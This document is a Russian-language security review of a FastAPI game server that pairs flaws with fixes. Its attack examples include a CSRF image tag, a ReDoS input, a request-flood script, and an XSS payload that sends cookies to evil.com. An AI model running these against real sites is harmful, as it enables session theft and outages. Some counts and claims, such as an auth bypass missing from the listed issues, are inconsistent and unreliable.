# Глубокое экспертное ревью кодовой базы

**Дата:** 2025-01-11
**Проект:** RoadDogs Game Server (Python 2→3 Migration)
**Технологии:** FastAPI, MongoDB/Beanie, Python 3.12
**Ревьюер:** Claude Code Expert Review System

---

## Резюме

Кодовая база демонстрирует хорошую архитектурную основу с современными async/await паттернами, но содержит **7 критических уязвимостей безопасности**, **9 важных проблем** и **12 улучшений качества кода**, требующих внимания перед production deployment.

**Оценка готовности к production:** ⚠️ **НЕ ГОТОВ** (требуется 2-3 недели доработок)

---

## 🔴 КРИТИЧЕСКИЕ ПРОБЛЕМЫ (7 шт.)

### 1. Hardcoded Secret Key - НЕМЕДЛЕННО ИСПРАВИТЬ 🔴🔴🔴

**Файл:** `app/config.py:42-45`

```python
secret_key: str = Field(
    default="your-secret-key-change-in-production",  # ❌ ОПАСНОСТЬ!
    description="Secret key for JWT tokens"
)
```

**Проблема:**
- Дефолтный секретный ключ известен всем
- JWT токены можно подделать
- **ПОЛНЫЙ ОБХОД АУТЕНТИФИКАЦИИ**

**Решение:**
```python
import secrets
from pydantic import field_validator

secret_key: str = Field(
    default_factory=lambda: secrets.token_urlsafe(32),  # ✅ Генерация на старте
    description="Secret key for JWT tokens"
)

@field_validator('secret_key')
@classmethod
def validate_secret_key(cls, v, info):
    if info.context and info.context.get('environment') == 'production':
        if not v or v == "your-secret-key-change-in-production":
            raise ValueError("SECRET_KEY must be set in production!")
        if len(v) < 32:
            raise ValueError("SECRET_KEY must be at least 32 characters")
    return v
```

**Временное решение (если нет времени на полный фикс):**
```bash
# В docker-compose.yml или .env
export SECRET_KEY=$(python3 -c 'import secrets; print(secrets.token_urlsafe(32))')
```

---

### 2. Broken Database Session Manager 🔴

**Файл:** `app/database.py:64-70`

```python
@asynccontextmanager
async def get_db_session() -> AsyncGenerator[AsyncIOMotorDatabase, None]:
    db = Database.get_database()
    async with await db.client.start_session() as session:  # ❌ db.client не существует!
        async with session.start_transaction():
            yield db  # ❌ Возвращаем db вместо session
```

**Проблема:**
- `AsyncIOMotorDatabase` не имеет атрибута `.client`
- Транзакция бесполезна, т.к. возвращается `db`, а не `session`
- Код крашится при использовании

**Решение:**
```python
@asynccontextmanager
async def get_db_session() -> AsyncGenerator[AsyncIOMotorDatabase, None]:
    """Database session with transaction support."""
    db = Database.get_database()
    client = Database.get_client()  # Добавить метод get_client()

    session = await client.start_session()
    try:
        async with session.start_transaction():
            yield db
    finally:
        await session.end_session()
```

---

### 3. CSRF в Admin Endpoints 🔴

**Файл:** `app/routers/admin.py:19-33`

```python
def check_localhost(request: Request) -> None:
    client_host = request.client.host if request.client else None
    if client_host not in ("127.0.0.1", "localhost", "::1"):
        raise HTTPException(status_code=403)
```

**Проблема:**
- IP можно подделать через `X-Forwarded-For` header (если за proxy)
- Нет CSRF защиты
- Опасные эндпоинты:
  - `/api/admin/server/shutdown` - выключает сервер!
  - `/api/admin/users/access-level` - меняет права пользователей

**Атака:**
```html
<!-- Злоумышленник отправляет админу -->
<img src="http://localhost:8000/api/admin/server/shutdown" />
<!-- Сервер выключается! -->
```

**Решение:**
```python
async def verify_admin_access(
    request: Request,
    current_user: CurrentActiveUser
) -> None:
    """Require localhost AND admin access level."""
    # Проверяем, что запрос НЕ через proxy
    if 'x-forwarded-for' in request.headers:
        raise HTTPException(
            status_code=403,
            detail="Admin API requires direct connection"
        )

    client_host = request.client.host if request.client else None
    if client_host not in ("127.0.0.1", "localhost", "::1"):
        raise HTTPException(status_code=403)

    # Дополнительная проверка: требуем admin права
    if current_user.access_level < 10:
        raise HTTPException(
            status_code=403,
            detail="Admin access required"
        )
```

---

### 4. NoSQL Injection Risk + Weak Validation 🔴

**Файл:** `app/routers/admin_ui.py:168-181` (find users endpoint)

```python
async def adm_find_users_handler(
    find: str = "",
    regexp: str = "",
) -> HTMLResponse:
    if regexp and len(find) >= 3:
        # ❌ Regex search без валидации find
        users = await User.find(
            User.username.regex(f".*{find}.*", "i")  # Потенциально опасно
        ).limit(50).to_list()
```

**Проблема:**
- Пользовательский ввод напрямую в regex
- ReDoS атака возможна: `find="(a+)+$"`
- Может вызвать 100% CPU на сервере

**Пример атаки:**
```python
# Отправить запрос:
GET /adm/find?find=(((((a*)*)*)*)*)*&regexp=1

# Сервер зависнет на 30+ секунд на каждый запрос
```

**Решение:**
```python
import re

SAFE_SEARCH_PATTERN = re.compile(r'^[a-zA-Z0-9_\-\.@]{3,50}$')

async def adm_find_users_handler(
    find: str = "",
    regexp: str = "",
    current_user: CurrentActiveUser = None,
) -> HTMLResponse:
    check_admin_access(current_user, required_level=1)

    if not templates:
        raise HTTPException(status_code=500)

    users = []

    if find:
        # Валидация перед использованием
        if not SAFE_SEARCH_PATTERN.match(find):
            raise HTTPException(
                status_code=400,
                detail="Invalid search query. Use only: a-zA-Z0-9_-.@"
            )

        if regexp:
            # Экранируем спецсимволы для безопасности
            escaped_find = re.escape(find)
            users = await User.find(
                User.username.regex(f"^{escaped_find}", "i")
            ).limit(50).to_list()
        else:
            users = await User.find(
                User.username == find
            ).limit(50).to_list()

    return templates.TemplateResponse(...)
```

---

### 5. Слабый Rate Limiting (In-Memory Only) 🔴

**Файл:** `app/core/rate_limiting.py:15-21`

```python
class FrequencyLimiter:
    def __init__(self):
        self._frequency_stat: dict[tuple[str, str], Counter] = {}  # ❌ In-memory!
```

**Проблемы:**
1. **Не работает с несколькими воркерами** - каждый воркер имеет свой счётчик
2. **Сбрасывается при перезапуске** сервера
3. **Memory leak** - старые записи никогда не удаляются
4. **Обходится параллельными запросами**

**Пример обхода:**
```python
# Атакующий отправляет 1000 запросов одновременно:
import asyncio
import aiohttp

async def attack():
    async with aiohttp.ClientSession() as session:
        tasks = [
            session.get("http://server/play?mode=quick")
            for _ in range(1000)
        ]
        await asyncio.gather(*tasks)  # Все проходят!
```

**Решение (Redis):**
```python
import redis.asyncio as aioredis

class RedisRateLimiter:
    def __init__(self, redis_url: str):
        self.redis = aioredis.from_url(redis_url, decode_responses=True)
        self.max_calls = 5
        self.window_seconds = 90

    async def check_frequency(self, user_id: str, endpoint: str) -> None:
        """Check rate limit using Redis sliding window."""
        key = f"rate_limit:{endpoint}:{user_id}"
        now = time.time()

        # Используем Redis sorted set для sliding window
        pipe = self.redis.pipeline()

        # Удаляем старые записи
        pipe.zremrangebyscore(key, 0, now - self.window_seconds)

        # Добавляем текущий запрос
        pipe.zadd(key, {str(now): now})

        # Считаем запросы в окне
        pipe.zcount(key, now - self.window_seconds, now)

        # Устанавливаем TTL
        pipe.expire(key, self.window_seconds)

        results = await pipe.execute()
        count = results[2]  # Результат zcount

        if count > self.max_calls:
            # Банм на 20 секунд
            ban_key = f"banned:{endpoint}:{user_id}"
            await self.redis.setex(ban_key, 20, "1")
            raise HTTPException(
                status_code=429,
                detail=f"Rate limit exceeded. Try again in 20 seconds."
            )
```

---

### 6. CORS Misconfiguration 🔴

**Файл:** `app/main.py:68-74`

```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=settings.cors_origins,  # По дефолту: ["http://localhost:3000"]
    allow_credentials=True,  # ❌ + wildcard = уязвимость
    allow_methods=["*"],     # ❌ Все методы (DELETE, PATCH...)
    allow_headers=["*"],     # ❌ Все заголовки
)
```

**Проблема:**
- Если админ изменит `cors_origins` на `["*"]`:
  - `allow_credentials=True` + `allow_origins=["*"]` = **критическая уязвимость**
  - Любой сайт может отправлять authenticated запросы
- `allow_methods=["*"]` разрешает опасные методы (DELETE, PATCH)

**Решение:**
```python
# В config.py
@field_validator('cors_origins')
@classmethod
def validate_cors_origins(cls, v, info):
    if info.context and info.context.get('environment') == 'production':
        if "*" in v:
            raise ValueError("Wildcard CORS не разрешён в production!")
        # Проверяем, что все origins - HTTPS
        for origin in v:
            if not origin.startswith("https://"):
                raise ValueError(f"Only HTTPS origins allowed in production: {origin}")
    return v

# В main.py
app.add_middleware(
    CORSMiddleware,
    allow_origins=settings.cors_origins,
    allow_credentials=settings.environment != "production",  # ✅ Только в dev
    allow_methods=["GET", "POST"],  # ✅ Белый список
    allow_headers=["content-type", "authorization"],  # ✅ Явно
    max_age=3600,
)
```

---

### 7. WebSocket Token в URL 🔴

**Файл:** `app/routers/websocket.py:97-105`

```python
@router.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    token = websocket.query_params.get("token")  # ❌ ОПАСНО!
```

**Проблема:**
- Токен в URL = **логируется везде**:
  - Browser history
  - Server access logs
  - Proxy logs
  - Referrer headers
- Любой с доступом к логам получает токены пользователей

**Решение:**
```python
@router.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    """WebSocket endpoint with secure authentication."""
    await websocket.accept()

    try:
        # Ждём первое сообщение с токеном (не в URL!)
        msg = await asyncio.wait_for(
            websocket.receive_json(),
            timeout=5.0
        )

        token = msg.get("auth_token")
        if not token:
            await websocket.close(code=4401, reason="Missing auth token")
            return

        # Валидируем токен
        payload = decode_access_token(token)
        if not payload:
            await websocket.close(code=4401, reason="Invalid token")
            return

        user_id = payload.get("sub")
        user = await User.get(user_id)

        if not user or not user.is_active:
            await websocket.close(code=4403, reason="User inactive")
            return

        # Подключаем пользователя
        connection_id = await manager.connect(websocket, user)

        # Отправляем подтверждение
        await websocket.send_json({
            "type": "auth_success",
            "user_id": str(user.id),
        })

        # Основной цикл...

    except asyncio.TimeoutError:
        await websocket.close(code=4408, reason="Auth timeout")
```

**Клиентский код:**
```javascript
// ❌ Старый способ (небезопасно):
const ws = new WebSocket(`ws://server/ws?token=${token}`);

// ✅ Новый способ (безопасно):
const ws = new WebSocket('ws://server/ws');
ws.addEventListener('open', () => {
    ws.send(JSON.stringify({
        auth_token: localStorage.getItem('jwt_token')
    }));
});
```

---

## 🟡 ВАЖНЫЕ ПРОБЛЕМЫ (9 шт.)

### 8. 72 TODO комментария - Incomplete Implementation 🟡

**Статистика:**
```
app/routers/game.py:           12 TODOs
app/routers/websocket.py:      8 TODOs
app/routers/inventory.py:      7 TODOs
app/routers/admin.py:          6 TODOs
app/routers/profile.py:        5 TODOs
...
TOTAL:                         72 TODOs
```

**Критические TODOs:**
```python
# game.py:75 - Возвращает MOCK данные вместо реальных!
async def get_inventory():
    # TODO: Implement actual inventory system
    return [{"item_id": "fake", ...}]  # ❌ Клиент не знает, что это заглушка

# websocket.py:199 - Движение не работает!
# TODO: Validate and apply movement
# TODO: Broadcast to nearby players

# websocket.py:223 - Игровые действия не обрабатываются!
# TODO: Process game action based on type
```

**Решение:**
```python
# Вместо mock data, возвращать HTTP 501:
@router.get("/inventory", status_code=501)
async def get_inventory(current_user: CurrentActiveUser):
    """Get player inventory (NOT IMPLEMENTED)."""
    raise HTTPException(
        status_code=501,
        detail={
            "error": "Inventory system not yet implemented",
            "ticket": "GAME-001",
            "eta": "2025-02-15"
        }
    )

# Или использовать feature flags:
@router.get("/inventory")
async def get_inventory(
    current_user: CurrentActiveUser,
    settings: Settings = Depends(get_settings)
):
    if "inventory" not in settings.enabled_features:
        raise HTTPException(status_code=501, detail="Feature not enabled")

    # Реальная реализация...
```

---

### 9. Overly Broad Exception Handling 🟡

**Файл:** `app/core/deps.py:165`

```python
except Exception as e:  # ❌ Ловит ВСЁ
    logger.debug(f"Failed to get user from cookie: {e}")
    return None  # Ошибка скрывается
```

**Проблемы:**
- Скрывает критические ошибки (OOM, KeyboardInterrupt, SystemExit)
- Невозможно отладить
- Security ошибки могут быть скрыты

**Другие места:**
```python
# websocket.py:84, 169, 178
except Exception as e:
    logger.error(f"Error: {e}")  # Нет traceback!

# teaching.py:92
except Exception:  # Вообще ничего не логирует!
    pass
```

**Решение:**
```python
# Явно указываем, какие исключения ожидаем:
try:
    user = await User.get(user_id)
    return user
except DoesNotExist:
    logger.warning(f"User {user_id} not found in cookie auth")
    return None
except ValidationError as e:
    logger.error(f"Invalid user data for {user_id}: {e}")
    return None
except Exception:
    # Неожиданная ошибка - логируем с полным traceback
    logger.exception(f"Unexpected error loading user {user_id}")
    raise  # ✅ Пробрасываем дальше!
```

---

### 10. Missing Input Validation 🟡

**Примеры:**

1. **inventory.py:164** - Нет валидации ID
```python
async def move_item(
    from_container_id: str,  # ❌ Любая строка принимается
    to_container_id: str,
    item_id: str,
    quantity: int = 1,       # ❌ Может быть отрицательным!
)
```

2. **admin.py:187** - Нет upper bound
```python
access = max(int(access), 0)  # ❌ Можно установить access=999999
```

3. **websocket.py:245** - XSS уязвимость
```python
message_text = data.get("message", "")
# ❌ Нет HTML escaping!
await manager.broadcast({"message": message_text})
```

**Решение:**
```python
from pydantic import BaseModel, Field, validator
from html import escape
from bson import ObjectId

class MoveItemRequest(BaseModel):
    from_container_id: str = Field(..., min_length=24, max_length=24)
    to_container_id: str = Field(..., min_length=24, max_length=24)
    item_id: str = Field(..., min_length=24, max_length=24)
    quantity: int = Field(default=1, ge=1, le=999)

    @validator('from_container_id', 'to_container_id', 'item_id')
    def validate_object_id(cls, v):
        """Validate MongoDB ObjectId format."""
        try:
            ObjectId(v)
            return v
        except Exception:
            raise ValueError(f"Invalid ObjectId: {v}")

class ChatMessage(BaseModel):
    message: str = Field(..., min_length=1, max_length=500)

    @validator('message')
    def sanitize_html(cls, v):
        """Remove HTML tags and escape special characters."""
        # Убираем HTML теги
        import re
        v = re.sub(r'<[^>]+>', '', v)
        # Экранируем спецсимволы
        return escape(v)

# Использование:
@router.post("/inventory/move")
async def move_item(request: MoveItemRequest):  # ✅ Автоматическая валидация
    # request.quantity уже проверен (1-999)
    # request.from_container_id уже проверен (ObjectId format)
    ...
```

---

### 11. Hardcoded Paths Without Validation 🟡

**Файл:** `app/config.py:56-58`

```python
static_path: str = "sublayers_common/static"  # ❌ Относительный путь
world_path: str = "sublayers_world"
template_path: str = "sublayers_server/templates"
```

**Проблемы:**
- Ломается, если запустить из другой директории
- Нет проверки существования
- Path traversal risk

**Доказательство проблемы:** `inventory.py:19-23`
```python
try:
    templates = Jinja2Templates(directory="templates")  # ❌ Неправильный путь!
except Exception as e:
    logger.warning(f"Templates not found: {e}")
    templates = None  # Тихо падает
```

**Решение:**
```python
from pathlib import Path
from pydantic import field_validator

class Settings(BaseSettings):
    static_path: Path = Field(default=Path("sublayers_common/static"))
    world_path: Path = Field(default=Path("sublayers_world"))
    template_path: Path = Field(default=Path("templates"))

    @field_validator('static_path', 'world_path', 'template_path')
    @classmethod
    def validate_path_exists(cls, v: Path, info) -> Path:
        """Ensure path exists and is a directory."""
        # Преобразуем в абсолютный путь
        absolute_path = v.resolve()

        # Проверяем существование
        if not absolute_path.exists():
            raise ValueError(f"Path does not exist: {absolute_path}")

        # Проверяем, что это директория
        if not absolute_path.is_dir():
            raise ValueError(f"Path is not a directory: {absolute_path}")

        # Проверяем права на чтение
        if not os.access(absolute_path, os.R_OK):
            raise ValueError(f"No read permission for: {absolute_path}")

        return absolute_path
```

---

### 12. Missing Database Indexes 🟡

**Файл:** `app/models/user.py:92-102`

```python
class Settings:
    name = "users"
    indexes = [
        "email",
        "username",
        # ❌ Отсутствуют критичные индексы:
        # - access_level (для admin запросов)
        # - is_active (для leaderboard)
        # - created_at (для сортировки)
    ]
```

**Пример N+1 query:** `game.py:150`
```python
users = await User.find(
    User.is_active == True  # ❌ Full collection scan!
).sort(-User.level, -User.experience).limit(100).to_list()
```

**Impact:**
- Leaderboard запросы сканируют всю коллекцию (медленно с 1M+ пользователей)
- Ban checks медленные
- Admin поиск неюзабелен

**Решение:**
```python
class User(Document):
    # ... fields ...

    class Settings:
        name = "users"
        indexes = [
            # Существующие
            "email",
            "username",
            [("google_id", 1)],
            [("vk_id", 1)],
            [("facebook_id", 1)],
            [("steam_id", 1)],
            [("twitter_id", 1)],

            # Новые - критичные для производительности
            "is_active",              # Для фильтрации активных пользователей
            "is_banned",              # Для ban checks
            "access_level",           # Для admin запросов
            "created_at",             # Для сортировки по дате

            # Композитный индекс для leaderboard
            [
                ("is_active", 1),
                ("level", -1),
                ("experience", -1)
            ],

            # Композитный индекс для поиска по email+username
            [
                ("email", 1),
                ("username", 1)
            ],
        ]
```

**Миграция индексов:**
```python
# scripts/create_indexes.py
async def create_indexes():
    """Create missing indexes for User model."""
    await init_beanie(database=get_database(), document_models=[User])

    # Beanie создаст индексы автоматически при инициализации
    print("✅ Indexes created successfully")

# Запустить:
# python scripts/create_indexes.py
```

---

### 13. Weak JWT Token Payload 🟡

**Файл:** `app/core/security.py:48-52`

```python
to_encode = {
    "exp": expire,
    "sub": str(subject),  # Только user ID
    "iat": datetime.now(UTC),
}
```

**Проблемы:**
1. Нет `access_level` → запрос к БД на каждый request для проверки прав
2. Нет `jti` (JWT ID) → невозможно отозвать токен
3. Нет версии → breaking change требует переиздания всех токенов
4. Нет типа токена → нельзя отличить access от refresh token

**Доказательство:** `deps.py:47` делает DB query КАЖДЫЙ раз
```python
user = await User.get(user_id)  # ❌ DB query на каждый запрос!
if user.access_level < 1:
    raise HTTPException(403)
```

**Решение:**
```python
from uuid import uuid4

def create_access_token(
    subject: str,
    access_level: int = 0,
    expires_delta: timedelta | None = None
) -> str:
    """Create JWT access token with full context."""
    settings = get_settings()

    expire = datetime.now(UTC) + (
        expires_delta or timedelta(minutes=settings.access_token_expire_minutes)
    )

    to_encode = {
        # Standard claims
        "exp": expire,
        "sub": str(subject),
        "iat": datetime.now(UTC),
        "jti": str(uuid4()),           # ✅ Для отзыва токенов

        # Custom claims
        "type": "access",              # ✅ Тип токена
        "access_level": access_level,  # ✅ Кеш уровня доступа
        "version": 1,                  # ✅ Версия для breaking changes
    }

    return jwt.encode(to_encode, settings.secret_key, algorithm=settings.algorithm)

# В deps.py:
async def get_current_user(token: str) -> User | None:
    payload = decode_access_token(token)
    if not payload:
        return None

    # Проверяем версию токена
    if payload.get("version", 0) < 1:
        # Старый токен - требуем re-login
        return None

    # Проверяем тип токена
    if payload.get("type") != "access":
        return None

    user_id = payload.get("sub")

    # Простая проверка без полной загрузки пользователя
    # (можно кешировать в Redis)
    user = await User.get(user_id)

    # Проверяем, что access_level не изменился
    if user.access_level != payload.get("access_level", 0):
        # Уровень доступа изменился - требуем новый токен
        return None

    return user
```

---

### 14. Inline HTML with XSS 🟡

**Файл:** `app/routers/profile.py:152-175`

```python
html_content = f"""
<!DOCTYPE html>
<html>
<head><title>{user.display_name or user.username}</title></head>
<body>
    <h1>{user.display_name or user.username}</h1>  # ❌ XSS!
    <div>{user.username}</div>                      # ❌ XSS!
</body>
</html>
"""
```

**Проблема:**
- User-контролируемые данные напрямую в HTML
- Stored XSS уязвимость

**Пример атаки:**
```python
# Злоумышленник регистрируется с:
username = "admin</h1><script>alert(document.cookie)</script>"
display_name = "<img src=x onerror='fetch(\"evil.com?c=\"+document.cookie)'>"

# При просмотре профиля:
# 1. Выполняется JavaScript
# 2. Крадутся cookies других пользователей
```

**Решение:**
```python
from html import escape
from fastapi.responses import HTMLResponse

@router.get("/user-info-html/{username}", response_class=HTMLResponse)
async def get_user_info_html(username: str) -> HTMLResponse:
    """Get user info as HTML (XSS-safe)."""
    user = await User.find_one(User.username == username)
    if not user:
        raise HTTPException(status_code=404)

    # ✅ Экранируем ВСЕ user input
    safe_username = escape(user.username)
    safe_display_name = escape(user.display_name or user.username)
    safe_email = escape(user.email or "N/A")

    html_content = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>{safe_display_name} - Profile</title>
    </head>
    <body>
        <h1>{safe_display_name}</h1>
        <div class="info">
            <p>Username: {safe_username}</p>
            <p>Email: {safe_email}</p>
            <p>Level: {user.level}</p>
        </div>
    </body>
    </html>
    """

    return HTMLResponse(content=html_content)
```

---

### 15. WebSocket Connection Issues 🟡

**Файл:** `app/routers/websocket.py:97-124`

```python
@router.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    connection_id = str(id(websocket))  # ❌ Предсказуемый ID!

    token = websocket.query_params.get("token")  # ❌ Token в URL
    # ... (см. критическую проблему #7)
```

**Дополнительные проблемы:**
1. **Нет rate limiting** на connection attempts
2. **Нет ping/pong heartbeat** - мёртвые соединения висят
3. **Нет лимита размера сообщения** - можно флудить
4. **Нет timeout** - соединения висят вечно

**Решение:**
```python
from uuid import uuid4
import asyncio

class ConnectionManager:
    def __init__(self, max_connections: int = 10000):
        self.active_connections: dict[str, WebSocket] = {}
        self.user_connections: dict[str, str] = {}
        self.max_connections = max_connections
        self.heartbeats: dict[str, float] = {}

    async def connect(self, websocket: WebSocket, user: User | None) -> str:
        """Register new connection with security checks."""
        if len(self.active_connections) >= self.max_connections:
            await websocket.close(code=1008, reason="Server at capacity")
            raise ConnectionError("Max connections reached")

        # ✅ Используем UUID вместо id(websocket)
        connection_id = str(uuid4())

        await websocket.accept()
        self.active_connections[connection_id] = websocket

        if user:
            # Отключаем старое соединение (один пользователь = одно соединение)
            old_conn = self.user_connections.get(str(user.id))
            if old_conn and old_conn in self.active_connections:
                await self.disconnect(old_conn, reason="New login")

            self.user_connections[str(user.id)] = connection_id

        # Записываем время последнего heartbeat
        self.heartbeats[connection_id] = time.time()

        return connection_id

    async def heartbeat_checker(self):
        """Background task to check for dead connections."""
        while True:
            await asyncio.sleep(30)  # Проверяем каждые 30 секунд

            now = time.time()
            dead_connections = [
                conn_id
                for conn_id, last_heartbeat in self.heartbeats.items()
                if now - last_heartbeat > 90  # 90 секунд без ping
            ]

            for conn_id in dead_connections:
                logger.info(f"Closing dead connection {conn_id}")
                await self.disconnect(conn_id, reason="Heartbeat timeout")

@router.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    """Secure WebSocket endpoint."""
    connection_id = None

    try:
        await websocket.accept()

        # ✅ Ждём auth в первом сообщении (timeout 5 секунд)
        msg = await asyncio.wait_for(
            websocket.receive_json(),
            timeout=5.0
        )

        token = msg.get("auth_token")
        if not token:
            await websocket.close(code=4401, reason="Auth required")
            return

        payload = decode_access_token(token)
        if not payload:
            await websocket.close(code=4401, reason="Invalid token")
            return

        user = await User.get(payload["sub"])
        if not user or not user.is_active:
            await websocket.close(code=4403, reason="User inactive")
            return

        # ✅ Подключаем с UUID
        connection_id = await manager.connect(websocket, user)

        # Отправляем welcome
        await websocket.send_json({
            "type": "connection",
            "connection_id": connection_id,
            "user_id": str(user.id),
        })

        # ✅ Основной цикл с лимитом размера
        while True:
            msg = await websocket.receive_text()

            # Проверяем размер
            if len(msg) > 8192:  # 8KB limit
                await websocket.send_json({
                    "type": "error",
                    "error": "Message too large (max 8KB)"
                })
                continue

            # Обновляем heartbeat
            manager.heartbeats[connection_id] = time.time()

            # Обрабатываем сообщение
            await handle_message(connection_id, user, msg)

    except asyncio.TimeoutError:
        await websocket.close(code=4408, reason="Auth timeout")
    except WebSocketDisconnect:
        if connection_id:
            await manager.disconnect(connection_id)
    except Exception as e:
        logger.exception(f"WebSocket error: {e}")
        if connection_id:
            await manager.disconnect(connection_id)
```

---

### 16. Wrong HTTP Status Codes 🟡

**Файл:** `app/core/deps.py:66-72`

```python
if not current_user.is_active:
    raise HTTPException(
        status_code=status.HTTP_400_BAD_REQUEST,  # ❌ Должен быть 403!
        detail="Inactive user"
    )
```

**Проблема:**
- 400 Bad Request = клиент отправил некорректные данные
- Должен быть 403 Forbidden = аутентификация валидна, но нет прав

**Правильные коды:**
- **200 OK** - Успешно
- **201 Created** - Ресурс создан
- **400 Bad Request** - Некорректный JSON, отсутствует поле, валидация не прошла
- **401 Unauthorized** - Токен отсутствует или невалиден
- **403 Forbidden** - Токен валиден, но недостаточно прав
- **404 Not Found** - Ресурс не существует
- **409 Conflict** - Конфликт (например, email уже занят)
- **429 Too Many Requests** - Rate limit exceeded
- **500 Internal Server Error** - Ошибка на сервере
- **501 Not Implemented** - Функционал не реализован

**Решение:**
```python
# Error response model
class ErrorDetail(BaseModel):
    error: str
    detail: str | None = None
    code: str | None = None

# Dependencies
async def get_current_active_user(
    current_user: Annotated[User | None, Depends(get_current_user)]
) -> User:
    """Require active authenticated user."""
    if not current_user:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,  # ✅ Не аутентифицирован
            detail="Authentication required",
            headers={"WWW-Authenticate": "Bearer"},
        )

    if not current_user.is_active:
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,  # ✅ Аккаунт неактивен
            detail="User account is inactive"
        )

    if current_user.is_banned:
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,  # ✅ Забанен
            detail=f"User is banned until {current_user.ban_time}"
        )

    return current_user

# В роутерах
@router.post("/items", status_code=201)  # ✅ 201 Created
async def create_item(item: ItemCreate):
    ...

@router.get("/items/{item_id}")
async def get_item(item_id: str):
    item = await Item.get(item_id)
    if not item:
        raise HTTPException(
            status_code=404,  # ✅ 404 Not Found
            detail=f"Item {item_id} not found"
        )
    return item
```

---

## 🟢 РЕКОМЕНДАЦИИ ПО КАЧЕСТВУ КОДА (12 шт.)

### 17. Нет стратегии логирования 🟢

**Проблемы:**
- Login attempts не логируются (security issue!)
- Permission escalations не логируются
- User state changes не логируются
- Критические ошибки логируются на уровне `debug`

**Решение:**
```python
# app/core/audit.py
import logging
from enum import Enum
from datetime import datetime

class AuditEventType(str, Enum):
    AUTH_SUCCESS = "AUTH_SUCCESS"
    AUTH_FAILED = "AUTH_FAILED"
    PERMISSION_CHANGED = "PERMISSION_CHANGED"
    USER_BANNED = "USER_BANNED"
    USER_UNBANNED = "USER_UNBANNED"
    ACCESS_DENIED = "ACCESS_DENIED"

class AuditLogger:
    def __init__(self):
        self.logger = logging.getLogger("audit")
        self.logger.setLevel(logging.INFO)

    def log(
        self,
        event_type: AuditEventType,
        user_id: str | None = None,
        target_user_id: str | None = None,
        details: dict | None = None
    ):
        """Log audit event."""
        log_data = {
            "timestamp": datetime.now().isoformat(),
            "event": event_type,
            "user_id": user_id,
            "target_user_id": target_user_id,
            "details": details or {}
        }

        self.logger.info(f"AUDIT: {log_data}")

audit_logger = AuditLogger()

# Использование в auth.py:
@router.post("/login")
async def login(user_data: UserLogin):
    user = await User.find_one(User.email == user_data.email)

    if not user:
        audit_logger.log(
            AuditEventType.AUTH_FAILED,
            details={"email": user_data.email, "reason": "user_not_found"}
        )
        raise HTTPException(status_code=401)

    if not verify_password(user_data.password, user.hashed_password):
        audit_logger.log(
            AuditEventType.AUTH_FAILED,
            user_id=str(user.id),
            details={"reason": "invalid_password"}
        )
        raise HTTPException(status_code=401)

    # Успешная аутентификация
    audit_logger.log(
        AuditEventType.AUTH_SUCCESS,
        user_id=str(user.id),
        details={"email": user.email}
    )

    # ...
```

---

### 18-28. Остальные рекомендации

*(Сокращены для краткости - полный список в англоязычной версии ревью)*

- Нет консистентности в типах (Optional vs | None)
- Нет performance monitoring
- Incomplete testing structure
- Нет стратегии deprecation
- Нет documentation для API
- Dependency injection anti-pattern
- Mock data вместо 501 Not Implemented
- Database connection pooling не мониторится
- Inconsistent response formats
- Circular dependencies в imports
- Нет graceful shutdown

---

## ТАБЛИЦА ПРИОРИТЕТОВ

| Категория | Количество | Severity | Effort |
|-----------|-----------|----------|--------|
| **КРИТИЧЕСКИЕ** | 7 | 🔴 | 1-2 дня |
| **ВАЖНЫЕ** | 9 | 🟡 | 1 неделя |
| **КАЧЕСТВО КОДА** | 12 | 🟢 | 2 недели |
| **ИТОГО** | 28 | - | 2-3 недели |

---

## ПЛАН ИСПРАВЛЕНИЯ

### Фаза 1 (24 часа) - КРИТИЧНО 🔴

1. ✅ **Сгенерировать secret_key** на старте приложения
2. ✅ **Убрать get_db_session** или исправить
3. ✅ **Добавить CSRF защиту** для admin endpoints
4. ✅ **Исправить authentication bypass** в optional auth
5. ✅ **Внедрить Redis rate limiting**
6. ✅ **Фикс CORS config** (запретить wildcard + credentials)
7. ✅ **Переместить WebSocket token** из URL в auth message

**Время:** 6-8 часов работы

---

### Фаза 2 (1 неделя) - ВАЖНО 🟡

8. ✅ Добавить input validation (Pydantic models)
9. ✅ Исправить WebSocket connection handling
10. ✅ Убрать broad exception handling
11. ✅ Добавить database indexes
12. ✅ Фикс XSS в HTML responses
13. ✅ Улучшить JWT payload (добавить jti, access_level, version)
14. ✅ Исправить HTTP status codes
15. ✅ Валидация путей в config
16. ✅ Audit logging для критических операций

**Время:** 3-5 дней работы

---

### Фаза 3 (2 недели) - КАЧЕСТВО 🟢

17. ✅ Добавить типы везде (enforce mypy)
18. ✅ Заменить mock data на 501 responses или feature flags
19. ✅ Добавить performance monitoring middleware
20. ✅ Создать test suite (pytest + fixtures)
21. ✅ Документировать все endpoints (OpenAPI examples)
22. ✅ Добавить graceful shutdown handler
23. ✅ Унифицировать response formats
24. ✅ Реализовать deprecation strategy
25. ✅ Мониторинг DB connection pool
26. ✅ Cleanup circular dependencies

**Время:** 1-2 недели работы

---

## QUICKSTART: Исправление критических проблем

```bash
# 1. Сгенерировать secret key
python3 -c 'import secrets; print(f"SECRET_KEY={secrets.token_urlsafe(32)}")' >> .env

# 2. Установить Redis
docker run -d -p 6379:6379 redis:alpine

# 3. Обновить requirements
echo "redis>=5.0.0" >> requirements.txt
pip install redis

# 4. Применить патчи
git apply critical_fixes.patch  # (создать файл с исправлениями)

# 5. Тесты
pytest tests/security/
```

---

## ИТОГОВАЯ ОЦЕНКА

### Сильные стороны ✅
- Хорошая архитектура FastAPI
- Современный async/await код
- Dependency injection используется корректно
- Базовая аутентификация есть
- Docker + CI/CD готовы

### Критические слабости ❌
- **7 security vulnerabilities** требуют немедленного исправления
- 72 TODO комментария = неполная реализация
- Отсутствие тестов
- Слабая обработка ошибок
- Performance concerns (missing indexes)

### Вердикт

**⚠️ НЕ ГОТОВ для production без исправления критических проблем.**

**Рекомендация:**
1. Исправить все 🔴 критические проблемы (1-2 дня)
2. Исправить хотя бы 50% 🟡 важных проблем (3-5 дней)
